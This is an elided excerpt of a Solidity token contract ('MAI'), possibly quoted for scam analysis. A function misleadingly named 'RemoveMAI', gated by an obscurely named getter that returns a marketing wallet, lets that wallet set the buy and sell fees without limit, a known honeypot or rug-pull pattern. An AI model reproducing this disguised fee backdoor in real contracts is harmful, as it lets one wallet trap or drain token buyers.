...
contract MAI {
    ...
    function RemoveMAI(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _TokenMixAiMktWithZkVerify()) revert Permissions();
        MixAitrade(_buy, _sell);
    }


    function MixAitrade(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }


    function _TokenMixAiMktWithZkVerify() private view returns(address) {
        return storeData.tokenMkt;
    }


    function OpenTrading() external {
        require(msg.sender == _TokenMixAiMktWithZkVerify());
        require(!tradingOpen);
    ...
    function _transfer(
        ...
        address tokenMkt = _TokenMixAiMktWithZkVerify();
